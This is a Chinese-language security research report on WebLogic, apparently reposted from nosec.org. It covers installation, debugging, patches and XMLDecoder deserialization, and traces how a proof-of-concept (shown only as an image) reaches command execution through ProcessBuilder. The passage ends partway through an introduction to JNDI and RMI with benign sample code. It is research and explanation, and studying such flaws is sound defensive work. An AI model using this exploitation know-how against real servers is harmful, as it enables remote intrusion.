---
description: 可能是你能找到的最详细的WebLogic安全相关中文文档
---

# WebLogic安全研究报告

以下内容来自「[iso60001-WebLogic安全研究报告](https://nosec.org/home/detail/2859.html)」，我看了之后深受启发，也由此开启了WebLogic正确的漏洞挖掘之路，具体内容如下：

## 序言

        从我还未涉足安全领域起，就知道WebLogic的漏洞总会在安全圈内变成热点话题。WebLogic爆出新漏洞的时候一定会在朋友圈刷屏。在从事安全行业之后，跟了几个WebLogic漏洞，写了一些分析，也尝试挖掘新漏洞和绕过补丁。但因为能力有限，还需要对WebLogic，以及Java反序列化有更深入的了解才能在漏洞挖掘和研究上更得心应手。因此决定写这样一篇长文把我所理解的WebLogic和WebLogic漏洞成因、还有这一切涉及到的相关知识讲清楚，也是自己深入WebLogic的过程。因此，本文不是一篇纯漏洞分析，而主要在讲“是什么”、“什么样”、“为什么”。希望把和WebLogic漏洞有关的方方面面都讲一些，今后遇到类似的问题有据可查。

## 中间件（Middleware）

{% hint style="info" %}
中间件是一种独立的系统软件或服务程序,分布式应用软件借助这种软件在不同的技术之间共享资源, 中间件位于客户机服务器的操作系统之上，管理计算资源和网络通信。
{% endhint %}

中间件是指连接软件组件或企业应用程序的软件。中间件是位于操作系统和分布式计算机网络两侧的应用程序之间的软件层。它可以被描述为“软件胶水。通常，它支持复杂的分布式业务软件应用程序。

![1.png](https://nosec.org/avatar/uploads/attach/image/c6b0cc21c218a76fd271dbba7dbea2df/1.png)

Oracle定义中间件的组成包括Web服务器、应用程序服务器、内容管理系统及支持应用程序开发和交付的类似工具，它通常基于可扩展标记语言（xml）、简单对象访问协议（SOAP）、Web服务、SOA、Web 2.0和轻量级目录访问协议（LDAP）等技术。

### Oracle融合中间件（Oracle Fusion Middleware）

Oracle融合中间件是Oracle提出的概念，Oracle融合中间件为复杂的分布式业务软件应用程序提供解决方案和支持。Oracle融合中间件是一系列软件产品并包括一系列工具和服务， 如：符合Java Enterprise Edition 5（Java EE）的开发和运行环境、商业智能、协作和内容管理等。Oracle融合中间件为开发、部署和管理提供全面的支持。Oracle融合中间件通常提供以下图中所示的解决方案：

![2.png](https://nosec.org/avatar/uploads/attach/image/f091f59946e56a85e0f55baa560eaffd/2.png)

Oracle融合中间件提供两种类型的组件：

* Java组件

Java组件用于部署一个或多个Java应用程序，Java组件作为域模板部署到Oracle WebLogic Server域中。这里提到的Oracle WebLogic Server域在后面会随着Oracle WebLogic Server详细解释。

* 系统组件

系统组件是被Oracle Process Manager and Notification \(OPMN\)管理的进程，其不作为Java应用程序部署。系统组件包括Oracle HTTP Server、Oracle Web Cache、Oracle Internet Directory、Oracle Virtual Directory、Oracle Forms Services、Oracle Reports、Oracle Business Intelligence Discoverer、Oracle Business Intelligence。

## Oracle WebLogic Server（WebLogic）

Oracle WebLogic Server（以下简称WebLogic）是一个可扩展的企业级Java平台（Java EE）应用服务器。其完整实现了Java EE 5.0规范，并且支持部署多种类型的分布式应用程序。

在前面Oracle融合中间件的介绍中，我们已经发现了其中贯穿着WebLogic的字眼，且Oracle融合中间件和WebLogic也是我在漏洞分析时经常混淆的。实际上WebLogic是组成Oracle融合中间件的核心。几乎所有的Oracle融合中间件产品都需要运行WebLogic Server。因此，**本质上，WebLogic Server不是Oracle融合中间件，而是构建或运行Oracle融合中间件的基础，Oracle融合中间件和WebLogic密不可分却在概念上不相等。**

### Oracle WebLogic Server域

Oracle WebLogic Server域又是WebLogic的核心。Oracle WebLogic Server域是一组逻辑上相关的Oracle WebLogic Server资源组。域包括一个名为Administration Server的特殊Oracle WebLogic Server实例，它是配置和管理域中所有资源的中心点。也就是说无论是Web应用程序、EJB（Enterprise JavaBeans）、Web服务和其他资源的部署和管理都通过Administration Server完成。

![3.png](https://nosec.org/avatar/uploads/attach/image/550baf11d17cad07b919f720b75a5be7/3.png)

### Oracle WebLogic Server集群

WebLogic Server群集由多个同时运行的WebLogic Server服务器实例组成，它们协同工作以提供更高的可伸缩性和可靠性。因为WebLogic本身就是为分布式设计的中间件，所以集群功能也是WebLogic的重要功能之一。也就有了集群间通讯和同步，WebLogic的众多安全漏洞也是基于这个特性。

## WebLogic的版本

WebLogic版本众多，但是现在我们经常见到的只有两个类别：10.x和12.x，这两个大版本也叫WebLogic Server 11g和WebLogic Server 12c。

根据Oracle官方下载页面[https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html](https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html)（从下向上看）：

10.x的版本为Oracle WebLogic Server 10.3.6，这个版本也是大家用来做漏洞分析的时候最喜欢拿来用的版本。P牛的vulhub\([https://github.com/vulhub/vulhub](https://github.com/vulhub/vulhub)\)中所有WebLogic漏洞靶场都是根据这个版本搭建的。

12.x的主要版本有：

* Oracle WebLogic Server 12.1.3
* Oracle WebLogic Server 12.2.1
* Oracle WebLogic Server 12.2.1.1
* Oracle WebLogic Server 12.2.1.2
* Oracle WebLogic Server 12.2.1.3

值得注意的是，**Oracle WebLogic Server 10.3.6支持的最低JDK版本为JDK1.6， Oracle WebLogic Server 12.1.3支持的最低JDK版本为JDK1.7，Oracle WebLogic Server 12.2.1及以上支持的最低JDK版本为JDK1.8**。因此由于JDK的版本不同，尤其是反序列化漏洞的利用方式会略有不同。同时，**不同的Oracle WebLogic Server版本依赖的组件\(jar包\)也不尽相同，因此不同的WebLogic版本在反序列化漏洞的利用上可能需要使用不同的Gadget链（反序列化漏洞的利用链条）。**但这些技巧性的东西不是本文的重点，请参考其他文章。如果出现一些PoC在某些时候可以利用，某些时候利用不成功的情况，应考虑到这两点。

## WebLogic的安装

在我做WebLogic相关的漏洞分析时，搭建环境的过程可谓痛苦。某些时候需要测试不同的WebLogic版本和不同的JDK版本各种排列组合。于是在我写这篇文章的同时，我也对解决WebLogic环境搭建这个痛点上做了一点努力。随这篇文章会开源一个Demo级别的WebLogic环境搭建工具，工具地址：[https://github.com/QAX-A-Team/WeblogicEnvironment](https://github.com/QAX-A-Team/WeblogicEnvironment)关于这个工具我会在后面花一些篇幅具体说，这里我先把WebLogic的安装思路和一些坑点整理一下。注意后面内容中出现的`$MW_HOME`均为middleware中间件所在目录，`$WLS_HOME`均为WebLogic Server所在目录。

第一步：安装JDK。首先需要明确你要使用的WebLogic版本，WebLogic的安装需要JDK的支持，因此参考上一节各个WebLogic版本所对应的JDK最低版本选择下载和安装对应的JDK。一个小技巧，如果是做安全研究，直接安装对应WebLogic版本支持的最低JDK版本更容易复现成功。

第二步：安装WebLogic。从Oracle官方下载页面下载对应的WebLogic安装包，如果你的操作系统有图形界面，可以双击直接安装。如果你的操作系统没有图形界面，参考静默安装文档安装。11g和12c的静默安装方式不尽相同：

11g静默安装文档：[https://oracle-ba se.com/articles/11g/weblogic-silent-installation-11g12c](https://oracle-ba%20se.com/articles/11g/weblogic-silent-installation-11g12c)静默安装文档：[https://oracle-ba se.com/articles/12c/weblogic-silent-installation-12c](https://oracle-ba%20se.com/articles/12c/weblogic-silent-installation-12c)

第三步：创建Oracle WebLogic Server域。前两步的安装都完成之后，要启动WebLogic还需要创建一个WebLogic Server域，如果有图形界面，在`$WLS_HOME\common\bin`中找到`config.cmd（Windows）`或`config.sh（Unix/Linux）`双击，按照向导创建域即可。同样的，创建域也可以使用静默创建方式，参考文档：《Silent Oracle Fusion Middleware Installation and Deinstallation——Creating a WebLogic Domain in Silent Mode》[https://docs.oracle.com/cd/E28280\_01/install.1111/b32474/silent\_install.htm\#CHDGECID](https://docs.oracle.com/cd/E28280_01/install.1111/b32474/silent_install.htm#CHDGECID)

第四步：启动WebLogic Server。我们通过上面的步骤已经创建了域，在对应域目录下的`bin/`文件夹找到`startWebLogic.cmd（Windows）`或`startWebLogic.sh（Unix/Linux）`，运行即可。

下图为已启动的WebLogic Server：

![4.png](https://nosec.org/avatar/uploads/attach/image/0a4f04e4ba9224d8ffeb383ee6607de1/4.png)

安装完成后，打开浏览器访问“[http://localhost:7001/console/](http://localhost:7001/console/)”，输入安装时设置的账号密码，即可看到WebLogic Server管理控制台：

![5.png](https://nosec.org/avatar/uploads/attach/image/c016a0099bd1c8d3539a314078eb5c3c/5.png)

看到这个页面说明我们已经完成了WebLogic Server的环境搭建。WebLogic集群不在本文的讨论范围。关于这个页面的内容，主要围绕着Java EE规范的全部实现和管理展开，以及WebLogic Server自身的配置。非常的庞大。也不是本文能讲完的。

## WebLogic官方示例

在我研究WebLogic的时候，官方文档经常提到官方示例，但我正常安装后并没有找到任何示例源码（sample文件夹）。这是因为官方示例在一个补充安装包中。如果需要看官方示例，请在下载WebLogic安装包的同时下载补充安装包，在安装好WebLogic后，按照文档安装补充安装包，官方示例即是一个单独的WebLogic Server域：

![6.png](https://nosec.org/avatar/uploads/attach/image/006b8b8a528170fc7136377c5b541ab9/6.png)

## WebLogic远程调试

若要远程调试WebLogic，需要修改当前WebLogic Server域目录下`bin/setDomainEnv.sh`文件，添加如下配置：

```text
debugFlag="true"export debugFlag
```

然后重启当前WebLogic Server域，并拷贝出两个文件夹：`$MW_HOME/modules`\(11g\)、`$WLS_HOME/modules`\(12c\)和`$WLS_HOME/server/lib`。

以IDEA为例，将上面的的`lib`和`modules`两个文件夹添加到Library：

![7.png](https://nosec.org/avatar/uploads/attach/image/45767885e8bdea142da304d09b393a23/7.png)

然后点击 Debug-Add Configuration... 添加一个远程调试配置如下：

![8.png](https://nosec.org/avatar/uploads/attach/image/ea5e24c24e36644d683d7e2529c8d133/8.png)

然后点击调试，出现以下字样即可正常进行远程调试。

`Connected to the target VM, address: 'localhost:8453', transport: 'socket'`

## WebLogic安全补丁

WebLogic安全补丁通常发布在Oracle关键补丁程序更新、安全警报和公告\([https://www.oracle.com/technetwork/topics/security/alerts-086861.html](https://www.oracle.com/technetwork/topics/security/alerts-086861.html)\)页面中。其中分为关键补丁程序更新（CPU）和安全警报（Oracle Security Alert Advisory）。

关键补丁程序更新为Oracle每个季度初定期发布的更新，通常发布时间为每年1月、4月、7月和10月。安全警报通常为漏洞爆出但距离关键补丁程序更新发布时间较长，临时通过安全警报的方式发布补丁。

所有补丁的下载均需要Oracle客户支持识别码，也就是只有真正购买了Oracle的产品才能下载。

## WebLogic漏洞分类

WebLogic爆出的漏洞以反序列化为主，通常反序列化漏洞也最为严重，官方漏洞评分通常达到9.8。WebLogic反序列化漏洞又可以分为xmlDecoder反序列化漏洞和T3反序列化漏洞。其他漏洞诸如任意文件上传、XXE等等也时有出现。因此后面的文章将以WebLogic反序列化漏洞为主讲解WebLogic安全问题。

下表列出了一些WebLogic已经爆出的漏洞情况：

![9.png](https://nosec.org/avatar/uploads/attach/image/7d1e3b57088ad8d8f40e01ddea1ce589/9.png)



### Java序列化、反序列化和反序列化漏洞的概念

关于Java序列化、反序列化和反序列化漏洞的概念，可参考@gyyyy写的一遍非常详细的文章：《浅析Java序列化和反序列化》\([https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md](https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md)\)。这篇文章对这些概念做了详细的阐述和分析。我这里只引用一段话来简要说明Java反序列化漏洞的成因：

> 当服务端允许接收远端数据进行反序列化时，客户端可以提供任意一个服务端存在的目标类的对象 （包括依赖包中的类的对象） 的序列化二进制串，由服务端反序列化成相应对象。如果该对象是由攻击者『精心构造』的恶意对象，而它自定义的readobject\(\)中存在着一些『不安全』的逻辑，那么在对它反序列化时就有可能出现安全问题。

### xmlDecoder反序列化漏洞

#### 前置知识

**xml**

xml（Extensible Markup Language）是一种标记语言，在开发过程中，开发人员可以使用xml来进行数据的传输或充当配置文件。那么Java为了将对象持久化从而方便传输，就使得Philip Mine在JDK1.4中开发了一个用作持久化的工具，xmlDecoder与xmlEncoder。由于近期关于WebLogic xmlDecoder反序列化漏洞频发，本文此部分旨在JDK1.7的环境下帮助大家深入了解xmlDecoder原理，如有错误，欢迎指正。

> 注：由于JDK1.6和JDK1.7的Handler实现均有不同，本文将重点关注JDK1.7

**xmlDecder简介**

xmlDecoder是Philip Mine 在 JDK 1.4 中开发的一个用于将JavaBean或POJO对象序列化和反序列化的一套API，开发人员可以通过利用xmlDecoder的`readobject()`方法将任意的xml反序列化，从而使得整个程序更加灵活。

**JAXP**

Java API for xml Processing（JAXP）用于使用Java编程语言编写的应用程序处理xml数据。JAXP利用Simple API for xml Parsing（SAX）和Document object Model（DOM）解析标准解析xml，以便您可以选择将数据解析为事件流或构建它的对象。JAXP还支持可扩展样式表语言转换（XSLT）标准，使您可以控制数据的表示，并使您能够将数据转换为其他xml文档或其他格式，如HTML。JAXP还提供名称空间支持，允许您使用可能存在命名冲突的DTD。从版本1.4开始，JAXP实现了Streaming API for xml（StAX）标准。

![10.png](https://nosec.org/avatar/uploads/attach/image/bf48cb0e9326619853a0444d26a708b4/10.png)

DOM和SAX其实都是xml解析规范，只需要实现这两个规范即可实现xml解析。二者的区别从标准上来讲，DOM是w3c的标准，而SAX是由xml\_DEV邮件成员列表的成员维护，因为SAX的所有者David Megginson放弃了对它的所有权，所以SAX是一个自由的软件。

**DOM与SAX的区别**

DOM在读取xml数据的时候会生成一棵“树”，当xml数据量很大的时候，会非常消耗性能，因为DOM会对这棵“树”进行遍历。而SAX在读取xml数据的时候是线性的，在一般情况下，是不会有性能问题的。

图为DOM与SAX更为具体的区别：

![11.png](https://nosec.org/avatar/uploads/attach/image/2d779291138a2ef497edf21da6fcbe6c/11.png)

由于xmlDecoder使用的是SAX解析规范，所以本文不会展开讨论DOM规范。

**SAX**

SAX是简单xml访问接口，是一套xml解析规范，使用事件驱动的设计模式，那么事件驱动的设计模式自然就会有事件源和事件处理器以及相关的注册方法将事件源和事件处理器连接起来。

![12.png](https://nosec.org/avatar/uploads/attach/image/e62be1dee1f2c8e6098f1bba18ad970f/12.png)

这里通过JAXP的工厂方法生成SAX对象，SAX对象使用`SAXParser.parer()`作为事件源，`ContentHandler`、`ErrorHandler`、`DTDHandler`、`EntityResolver`作为事件处理器，通过注册方法将二者连接起来。

![13.png](https://nosec.org/avatar/uploads/attach/image/14a47e93ceb87dfe02c1905a6b6c49d1/13.png)

ContentHandler

这里看一下`ContentHandler`的几个重要的方法。

![14.png](https://nosec.org/avatar/uploads/attach/image/eff3330de89cd8dd5ddc9fa73bdaae40/14.png)

**使用SAX**

![15.png](https://nosec.org/avatar/uploads/attach/image/d8067e4a2c9d5764b96e7673372387f7/15.png)

笔者将使用SAX提供的API来对这段xml数据进行解析。

首先实现`ContentHandler`，`ContentHandler`是负责处理xml文档内容的事件处理器。

![16.png](https://nosec.org/avatar/uploads/attach/image/1334f361ddfdb27b80dd0885c73c3079/16.png)

然后实现`ErrorHandler`， `ErrorHandler`是负责处理一些解析时可能产生的错误。

![17.png](https://nosec.org/avatar/uploads/attach/image/aad85b4c9ddeb324df03018c5aa97ba6/17.png)

最后使用Apache Xerces解析器完成解析。

![18.png](https://nosec.org/avatar/uploads/attach/image/61692a771c459f37e5cf68dea10f8e8c/18.png)

以上就是在Java中使用SAX解析xml的全过程，开发人员可以利用xmlFilter实现对xml数据的过滤。SAX考虑到开发过程中出现的一些繁琐步骤，所以在`org.xml.sax.helper`包实现了一个帮助类：`DefaultHandler`，`DefaultHandler`默认实现了四个事件处理器，开发人员只需要继承`DefaultHandler`即可轻松使用SAX：

![19.png](https://nosec.org/avatar/uploads/attach/image/811cb41f5c04e151b9c639c322c192cc/19.png)

**Apache Xerces**

![20.png](https://nosec.org/avatar/uploads/attach/image/13905a97f6f729ab1aecd1262430746c/20.png)

Apache Xerces解析器是一套用于解析、验证、序列化和操作xml的软件库集合，它实现了很多解析规范，包括DOM和SAX规范，Java官方在JDK1.5集成了该解析器，并作为默认的xml的解析器。——引用自[http://www.edankert.com/jaxpimplementations.html](http://www.edankert.com/jaxpimplementations.html)

**xmlDecoder反序列化流程分析**

JDK1.7的xmlDecoder实现了一个`DocumentHandler`，`DocumentHandler`在JDK1.6的基础上增加了许多标签，并且改进了很多地方的实现。下图是对比JDK1.7的`DocumentHandler`与JDK1.6的`objectHandler`在标签上的区别。

JDK1.7:

![21.png](https://nosec.org/avatar/uploads/attach/image/603d97d13754bc9c1467f7c2dfe29578/21.png)

JDK1.6：

![211.png](https://nosec.org/avatar/uploads/attach/image/5528391419ab8dbb769bb149bee44abb/211.png)

值得注意的是CVE-2019-2725的补丁绕过其中有一个利用方式就是基于JDK1.6。

**数据如何到达xerces解析器**

`xmlDecodeTest.readobject()`：

![23.png](https://nosec.org/avatar/uploads/attach/image/e5d7e4beae654c1311250670642208d7/23.png)

`java.beans.xmlDecoder.paringComplete()`：

![24.png](https://nosec.org/avatar/uploads/attach/image/ce8791ed03631def9822d473511bffcf/24.png)

`com.sun.beans.decoder.DocumentHandler.parse()`：

![25.png](https://nosec.org/avatar/uploads/attach/image/fd433e794773d47393408162d31b8470/25.png)

`com.sun.org.apache.xerces.internal.jaxp. SAXParserImpl.parse()`：

![26.png](https://nosec.org/avatar/uploads/attach/image/cc781d1f5458a3ae68ddd86c8c7d97d1/26.png)

`com.sun.org.apache.xerces.internal.jaxp. SAXParserImpl.parse()`：

![27.png](https://nosec.org/avatar/uploads/attach/image/3fd4b7331e6e736632a3a2214029b97a/27.png)

`com.sun.org.apache.xerces.internal.jaxp. AbstractSAXParser.parse()`：

![28.png](https://nosec.org/avatar/uploads/attach/image/b6c839476254602861448aa5db5cf058/28.png)

`com.sun.org.apache.xerces.internal.parsers. xmlParser.parse()`：

![29.png](https://nosec.org/avatar/uploads/attach/image/e2e16831bd86c22bec8f957348e352cb/29.png)

`com.sun.org.apache.xerces.internal.parsers. xml11Configuration.parse()`：

![30.png](https://nosec.org/avatar/uploads/attach/image/a2e62b06289d703cb7f899e21666ee73/30.png)

在这里已经进入xerces解析器`com.sun.org.apache.xerces.internal.impl. xmlDocumentFragmentScannerImpl.scanDocument()`：

![31.png](https://nosec.org/avatar/uploads/attach/image/ee5ce384047e5301486fd4bea763b5c5/31.png)

至此xerces开始解析xml，调用链如下：

![32.png](https://nosec.org/avatar/uploads/attach/image/42186451d1845510ba4d467d1f9e4ce1/32.png)

**Apache Xerces如何实现解析**

Apache Xerces有数个驱动负责完成解析，每个驱动司职不同，下面来介绍一下几个常用驱动的功能有哪些。

![333.png](https://nosec.org/avatar/uploads/attach/image/1314951ec634c56afabbfb9368e3ca8a/333.png)

由于Xerces解析流程太过繁琐，最后画一个总结性的解析流程图。

![34.png](https://nosec.org/avatar/uploads/attach/image/031e932c44bf8ea55599d0deddf71bf9/34.png)

现在我们已经了解Apache Xerces是如何完成解析的，Apache Xerces解析器只负责解析xml中有哪些标签，观察xml语法是否合法等因素，最终Apache Xerces解析器都要将解析出来的结果丢给DocumentHandler完成后续操作。

**DocumentHandler 工作原理**

xmlDecoder在`com.sun.beans.decoder`实现了`DocumentHandler`，`DocumentHandler`继承了`DefaultHandler`，并且定义了很多事件处理器：

![35.png](https://nosec.org/avatar/uploads/attach/image/45b64a3e612146a0235e25872d45a9d2/35.png)

我们先简单的看一下这些标签都有什么作用：

* object标签代表一个对象，object标签的值将会被这个对象当作参数。

```text
This class is intended to handle <object> element.

This element looks like <void> element,

but its value is always used as an argument for element

that contains this one.
```

* class标签主要负责类加载。

```text
This class is intended to handle <class> element.

This element specifies Class values.

The result value is created from text of the body of this element.

The body parsing is described in the class {@link StringElementHandler}.

For example:

<class>java.lang.Class</class>

is shortcut to

<method name="forName" class="java.lang.Class">

<string>java.lang.Class</string>

</method>

which is equivalent to {@code Class.forName("java.lang.Class")} in Java code.
```

* void标签主要与其他标签搭配使用，void拥有一些比较值得关注的属性，如class、method等。

```text
This class is intended to handle<void>element.

This element looks like <object>element,

but its value is not used as an argument for element

that contains this one.
```

* array标签主要负责数组的创建

```text
This class is intended to handle<array>element,

that is used to array creation.

The {@code length} attribute specifies the length of the array.

The {@code class} attribute specifies the elements type.

The {@link Object} type is used by default.

For example:

<array length="10">

is equivalent to {@code new Component[10]} in Java code.

The {@code set} and {@code get} methods,

as defined in the {@link java.util.List} interface,

can be used as if they could be applied to array instances.

The {@code index} attribute can thus be used with arrays.

For example:

<array length="3" class="java.lang.String">

<void index="1">

<string>Hello, world<string>

</void>

</array>

is equivalent to the following Java code:

String[] s = new String[3];

s[1] = "Hello, world";

It is possible to omit the {@code length} attribute and

specify the values directly, without using {@code void} tags.

The length of the array is equal to the number of values specified.

For example:

<array id="array" class="int">

<int>123</int>

<int>456</int>

</array>

is equivalent to {@code int[] array = {123, 456}} in Java code.
```

* method标签可以实现调用指定类的方法

```text
This class is intended to handle <method> element.

It describes invocation of the method.

The {@code name} attribute denotes

the name of the method to invoke.

If the {@code class} attribute is specified

this element invokes static method of specified class.

The inner elements specifies the arguments of the method.

For example:

<method name="valueOf" class="java.lang.Long">

<string>10</string>

</method>

is equivalent to {@code Long.valueOf("10")} in Java code.
```

在基本了解这些标签的作用之后，我们来看看WebLogic的PoC中为什么要用到这些标签。

`DocumentHandler`将Apache Xerces返回的标签分配给对应的事件处理器处理，比如xml的java标签，如果java标签内含有class属性，则会利用反射加载类。

![36.png](https://nosec.org/avatar/uploads/attach/image/9aae10c30055f13a7a2a175cb63c7684/36.png)

* object标签能够执行命令，是因为`objectElementHandler`事件处理器在继承`NewElementHandler`事件处理器后重写了`getValueobject()`方法，使用ex pression创建对象。

![37.png](https://nosec.org/avatar/uploads/attach/image/7021c372b9fc880faa7cd85b832bfe6d/37.png)

* new标签 new标签能够执行命令，是因为`NewElementHandler`事件处理器针对new标签的class属性有一个通过反射加载类的操作。

![38.png](https://nosec.org/avatar/uploads/attach/image/7d40c7df1f407070e8151e4616afb82b/38.png)

* void标签 void标签的事件处理器`VoidElementHandler`继承了`objectElementHandler`事件处理器，其本身并未实现任何方法，所以都会交给父类处理。

![39.png](https://nosec.org/avatar/uploads/attach/image/d99c76d5a93d6454af8ad5588e6deb05/39.png)

* class标签的事件处理器`ClassElementHandler`的`getValue()`使用反射拿到对象。

![40.png](https://nosec.org/avatar/uploads/attach/image/654cec19c09f0f528110de2225ea70b4/40.png)

**PoC分析**

此部分将针对一个PoC进行一个简单的分析，主要目的在于弄清这个PoC为什么能够执行命令。

![41.png](https://nosec.org/avatar/uploads/attach/image/11a446a678a6c66bd4f543424183b74b/41.png)

首先使用`JavaElementHandler`处理器将java标签中的class属性进行类加载。

![42.png](https://nosec.org/avatar/uploads/attach/image/6be58bda7a280c60963221d76d7841f0/42.png)

接着会对object标签进行处理，这一步主要是加载`java.lang.ProcessBuilder`类，由于`objectElementHandler`继承于`NewElementHandler`，所以将会使用`NewElementHandler`处理器来完成对这个类的加载。

![43.png](https://nosec.org/avatar/uploads/attach/image/37eb39f93462ce91f42e493591640a1f/43.png)

然后会对array标签进行处理，这一步主要是构建一个string类型的数组，用于存放想要执行的命令，使用array标签的length属性可以指定数组的长度，由于`ArrayElementHandler`继承`NewElementHandler`，所以由`NewElementHandler`处理器来完成数组的构建。

![44.png](https://nosec.org/avatar/uploads/attach/image/14a89216e71b2ea166d980c9c1298a34/44.png)

接着会对void标签进行处理，这里主要是把想要执行的命令放到void标签内，`VoidElementHandler`没有任何实现，它只继承了`objectElementHandler`，所以void标签内的属性都会由`objectElementHandler`处理器处理。

![45.png](https://nosec.org/avatar/uploads/attach/image/1942c08471bde25bb74b3928f69f859b/45.png)

然后会对string标签进行处理，这里主要是把string标签内的值取出来，使用`StringElementHandler`处理器处理。

![46.png](https://nosec.org/avatar/uploads/attach/image/f67ba16eec9f00e7bfb0db8f1462251c/46.png)

最后需要利用void标签的method属性来实现方法的调用，开始命令的执行，由于`VoidElementHandler`继承`objectElementHandler`，所以将会由`objectElementHandler`处理器来完成处理。

![47.png](https://nosec.org/avatar/uploads/attach/image/303f92ec5abcea5815a6d94a5c84053b/47.png)

最终在`objectElementHandler`处理器中，使用ex pression完成命令的执行。

![48.png](https://nosec.org/avatar/uploads/attach/image/21d27d9830752792dc1c6a598388d9c3/48.png)

完整的解析链：

![49.png](https://nosec.org/avatar/uploads/attach/image/410c740f312d57cf29467f11d4b28350/49.png)

**简要漏洞分析**

简单的分析一下xmlDecoder反序列化漏洞，以WebLogic 10.3.6为例，我们可以将断点放到`WLSServletAdapter.clas`128行，载入Payload，跟踪完整的调用流程，也可以直接将断点打在`WorkContextServerTube.class`的43行`readHeaderOld()`方法的调用上，其中`var3`参数即Payload所在：

![50.png](https://nosec.org/avatar/uploads/attach/image/5ffc62ee9de7415b4c8caef1f723d509/50.png)

继续跟入，到`WorkContextxmlInputAdapter.class`的`readUTF()`，`readUTF()`调用了`this.xmlDecoder.readobject()`，完成了第一次反序列化：xmlDecoder反序列化。

![51.png](https://nosec.org/avatar/uploads/attach/image/040d3fa7e0c05a1e2b967902141ce86d/51.png)

第二次反序列化即是Payload中的链触发的了，最终造成远程命令执行。

**补丁分析**

WebLogic xmlDecoder系列漏洞的补丁通常在`weblogic.wsee.workarea.WorkContextxmlInputAdapter.class`中，是以黑名单的方式修补：

![52.png](https://nosec.org/avatar/uploads/attach/image/53a9a1a806fc796bb128e84cdca9c8ce/52.png)

不过由于此系列漏洞经历了多次的修补和绕过，现在已变成黑名单和白名单结合的修补方式，下图为白名单：

![53.png](https://nosec.org/avatar/uploads/attach/image/9e6991e89f0ff4f3dee39d555f36b7ce/53.png)

### T3反序列化漏洞

#### 前置知识

在研究WebLogic相关的漏洞的时候大家一定见过JNDI、RMI、JRMP、T3这些概念，简单的说，T3是WebLogic RMI调用时的通信协议，RMI又和JNDI有关系，JRMP是Java远程方法协议。我曾经很不清晰这些概念，甚至混淆。因此在我真正开始介绍T3反序列化漏洞之前，我会对这些概念进行一一介绍。

#### **JNDI**

JNDI\(Java Naming and Directory Interface\)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。 JNDI可以兼容和访问现有目录服务如：DNS、XNam、LDAP、CORBA对象服务、文件系统、RMI、DSML v1&v2、NIS等。

我在这里用DNS做一个不严谨的比喻来理解JNDI。当我们想访问一个网站的时候，我们已经习惯于直接输入域名访问了，但其实远程计算机只有IP地址可供我们访问，那就需要DNS服务做域名的解析，取到对应的主机IP地址。JNDI充当了类似的角色，使用统一的接口去查找对应的不同的服务类型。

![54.png](https://nosec.org/avatar/uploads/attach/image/92800ab4a36fb2746324d24802155426/54.png)

看一下常见的JNDI的例子：

```text
jdbc://<domain>:<port>rmi://<domain>:<port>ldap://<domain>:<port>
```

JNDI的查找一般使用`lookup()`方法如`registry.lookup(name)`。

#### **RMI**

RMI\(Remote Method Invocation\)即远程方法调用。能够让在某个Java虚拟机上的对象像调用本地对象一样调用另一个Java虚拟机中的对象上的方法。它支持序列化的Java类的直接传输和分布垃圾收集。

Java RMI的默认基础通信协议为JRMP，但其也支持开发其他的协议用来优化RMI的传输，或者兼容非JVM，如WebLogic的T3和兼容CORBA的IIOP，其中T3协议为本文重点，后面会详细说。

为了更好的理解RMI，我举一个例子：

假设A公司是某个行业的翘楚，开发了一系列行业上领先的软件。B公司想利用A公司的行业优势进行一些数据上的交换和处理。但A公司不可能把其全部软件都部署到B公司，也不能给B公司全部数据的访问权限。于是A公司在现有的软件结构体系不变的前提下开发了一些RMI方法。B公司调用A公司的RMI方法来实现对A公司数据的访问和操作，而所有数据和权限都在A公司的控制范围内，不用担心B公司窃取其数据或者商业机密。

这种设计和实现很像当今流行的Web API，只不过RMI只支持Java原生调用，程序员在写代码的时候和调用本地方法并无太大差别，也不用关心数据格式的转换和网络上的传输。类似的做法在ASP.NET中也有同样的实现叫WebServices。

RMI远程方法调用通常由以下几个部分组成：

* 客户端对象
* 服务端对象
* 客户端代理对象（stub）
* 服务端代理对象（skeleton）

下面来看一下最简单的Java RMI要如何实现：

首先创建服务端对象类，先创建一个接口继承`java.rmi.Remote`:

```text
// IHello.java

import java.rmi.*;

public interface IHello extends Remote {

    public String sayHello() throws RemoteException;

}
```

然后创建服务端对象类，实现这个接口：

```text
// Hello.java

public class Hello implements IHello{

    public Hello() {}

    public String sayHello() {

        return "Hello, world!";

    }

}
```

创建服务端远程对象骨架并绑定在JNDI Registry上：

```text
// Server.java

import java.rmi.registry.Registry;

import java.rmi.registry.LocateRegistry;

import java.rmi.RemoteException;

import java.rmi.server.UnicastRemoteObject;

  

public class Server{

  

  public Server() throws RemoteException{}

  

  public static void main(String args[]) {

  

  try {

    // 实例化服务端远程对象

      Hello obj = new Hello();

    // 创建服务端远程对象的骨架（skeleton）

      IHello skeleton = (IHello) UnicastRemoteObject.exportObject(obj, 0);

      // 将服务端远程对象的骨架绑定到Registry上

      Registry registry = LocateRegistry.getRegistry();

      registry.bind("Hello", skeleton);

      System.err.println("Server ready");

  } catch (Exception e) {

      System.err.println("Server exception: " + e.toString());

      e.printStackTrace();

  }

  }

}
```

RMI的服务端已经构建完成，继续关注客户端：

```text
// Client.java

import java.rmi.registry.LocateRegistry;

import java.rmi.registry.Registry;

public class Client {

    private Client() {}

    public static void main(String[] args) {

  String host = (args.length < 1) ? "127.0.0.1" : args[0];

  try {

      Registry registry = LocateRegistry.getRegistry(host);

      // 创建客户端对象stub（存根）

      IHello stub = (IHello) registry.lookup("Hello");

      // 使用存根调用服务端对象中的方法

      String response = stub.sayHello();

      System.out.println("response: " + response);

  } catch (Exception e) {

      System.err.println("Client exception: " + e.toString());

      e.printStackTrace();

  }

    }

}
```

至此，简单的RMI服务和客户端已经构建完成，我们来看一下执行效果：

```text
$ rmiregistry &

[1] 80849

$  java Server &

[2] 80935

Server ready

$  java Client

response: Hello, world!
```

Java RMI的调用过程抓包如下：

![55.png](https://nosec.org/avatar/uploads/attach/image/8fa0be4c8c3a14ab733b708330633747/55.png)

